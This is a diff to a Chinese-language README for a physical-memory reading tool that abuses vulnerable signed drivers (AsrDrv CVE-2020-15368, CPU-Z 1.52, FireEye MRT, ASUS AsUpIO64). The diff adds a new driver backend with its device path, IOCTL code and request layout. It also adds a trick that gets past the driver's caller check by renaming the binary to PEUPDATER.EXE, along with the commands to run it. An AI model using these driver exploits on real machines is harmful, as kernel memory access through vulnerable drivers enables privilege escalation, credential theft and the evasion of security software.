@@ -52,6 +52,7 @@ typedef struct mb_phys_reader {
 | `asrdrv` | `\\.\AsrDrv109`，CVE-2020-15368 家族 AES 加密外层 IOCTL `0x22EC00` + 物理读 opcode `0x22E808`（Round 27 已静态确认的 AsrDrv(2).sys；动态验证待提权） |
 | `mrt` | `\\.\fekern_00`，FireEye/fekern MRT `MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C`（`MmCopyMemory` 物理读；设备 ACL SYSTEM-only；动态验证待 SYSTEM） |
 | `cpuz` | `\\.\Global\CPUZ152`（fallback `\\.\CPUZ152`），CPU-Z 1.52 物理 dword 读 `0x9C402708`；需 `--expect-first <dword>` 提供目标页首 dword 通过驱动校验；动态验证待提权 |
+| `asupio64` | `\\.\AsUpdateio`（ASUS EZ Update 3.00.03），物理映射 IOCTL `0xA040A480`（静态推导 24B 请求 `{interfaceType,busNumber,phys_start,addressSpace,size}` → 返回 user VA）；门控要求当前进程名含 `PEUPDATER.EXE`，需把 layers.exe 复制/改名为 `PEUPDATER.EXE`；动态验证待提权 |
 | `mock` | 离线自测用合成物理内存 |
 
 `membridge.exe` 已集成 22 个全 64 位物理读 backend（cchwapi/rtkio/eneio64/hp/gibepext/fastdump/directio/tdeio/icachex/mrt 等）；每个 backend 都只是取数层的一个实现，新增 backend 不影响定位层和翻译层。
@@ -68,7 +69,7 @@ typedef struct mb_phys_reader {
 - 伪造 `_EPROCESS`（PID 4242 / MOCK.exe / DTB 0x1000）；
 - 分别验证：取数层、翻译层、定位层、三层组合、独立性。
 
-结果（13/13 PASS）：
+结果（14/14 PASS）：
 ```
 [PASS] 取数层(fetcher): PA=0x5000 bytes match mock data
 [PASS] 翻译层(translator): VA=0x400000 -> PA=0x5000 (4KB page)
@@ -77,6 +78,7 @@ typedef struct mb_phys_reader {
 [PASS] 翻译层(translator): VA=0x40000000 -> PA=0x40000000 (1GB page)
 [PASS] 三层组合(pipeline): cross-page read VA 0x400FF0 (two 4KB pages)
 [PASS] 翻译层(translator): unmapped VA=0x800000 rejected
+[PASS] 取数层(fetcher): asupio64 map request layout (page-aligned)
 [PASS] 定位层(locator): PID 4242 / MOCK.exe -> CR3=0x1000 (physical scan)
 [PASS] 定位层(locator): fake EPROCESS PA=0x8000
 [PASS] 定位层(locator): kernel-reader list walk -> CR3=0x3000 (no physical reader)
@@ -125,6 +127,10 @@ VERDICT=PASS
 
 # 取数层：CPU-Z 1.52 物理 dword 读（需提供目标页首 dword）
 .\bin\layers.exe --reader cpuz --expect-first 0x42594F56 --read-phys --pa 0x10000000 --size 0x40
+
+# 取数层：AsUpIO64（先把 layers.exe 复制/改名为 PEUPDATER.EXE 以通过门控）
+copy .\bin\layers.exe .\bin\PEUPDATER.EXE
+.\bin\PEUPDATER.EXE --reader asupio64 --read-phys --pa 0x10000000 --size 0x40
 
 # 取数层：Round 27 的 AsrDrv(2) N-day provider（需先有管理员加载驱动）
 .\bin\layers.exe --reader asrdrv --read-phys --pa 0x10000000 --size 0x40
